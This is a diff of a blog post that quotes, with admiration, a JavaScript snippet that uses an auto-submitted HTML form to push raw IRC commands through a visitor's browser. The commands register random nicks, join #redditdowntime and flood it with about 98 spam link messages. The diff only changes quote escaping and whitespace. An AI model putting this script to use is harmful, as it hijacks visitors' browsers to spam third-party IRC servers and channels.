@@ -57,12 +57,12 @@
 &lt;/form&gt;
 
 &lt;script type=&quot;text/javascript&quot;&gt;
-    /* 
+    /*
      * Generate a random string of characters to use for an IRC nick
      */
     function rnd(){
         var chars=&quot;abcdefghijklmnopqrstuvwxyz&quot;;
-        var r=&#39;&#39;;
+        var r='';
         var length=Math.floor(Math.random()*10+3);
         for (var i=0;i&lt;length;i++){
             var rnum=Math.floor(Math.random() * chars.length);
@@ -72,22 +72,22 @@
     }
     function lol(){
         /* Grab a reference to the textarea */
-        var x = document.getElementById(&#39;x&#39;);
+        var x = document.getElementById('x');
         /* Grab a reference to the form itself */
-        var f = document.getElementById(&#39;f&#39;);
+        var f = document.getElementById('f');
         /* Generate a fake user-name */
         var i = rnd();
         /* Generate a fake nick */
         var n = rnd();
 
-        /* 
+        /*
          * Build a series of IRC commands into a string:
          *   - Set the username
-         *   - Set the nick 
+         *   - Set the nick
          *   - Join the channel to spam (#redditdowntime)
          *   - Queue up a bunch of PRIVMSG commands to the channel with the spam link
          */
-        x.value=&#39;\r\nUSER &#39;+i+&#39; 8 * :&#39;+n+&#39;\r\nNICK &#39;+n+&#39;\r\nJOIN #redditdowntime\r\n&#39;+new Array(99).join(&#39;PRIVMSG #redditdowntime :http://bit.ly/lolreddit\r\n&#39;)+&#39;&#39;;
+        x.value='\r\nUSER '+i+' 8 * :'+n+'\r\nNICK '+n+'\r\nJOIN #redditdowntime\r\n'+new Array(99).join('PRIVMSG #redditdowntime :http://bit.ly/lolreddit\r\n')+'';
 
         /* Submit the form, effectively sending the textarea contents to an IRC server */
         f.submit();
@@ -99,9 +99,7 @@
 &lt;/script&gt;
 &lt;h1&gt;DIGG ROOLZ! REDDIT DROOLZ!&lt;/h1&gt;
 </code></pre>
-
 <p>This is the most clever bits of JavaScript I think I’ve seen in recent months.</p>
-
 <p><a href="http://www.reddit.com/r/programming/comments/auog9/using_a_browser_to_piss_off_irc_users_or_spamming/">via</a></p>
 </article>
 
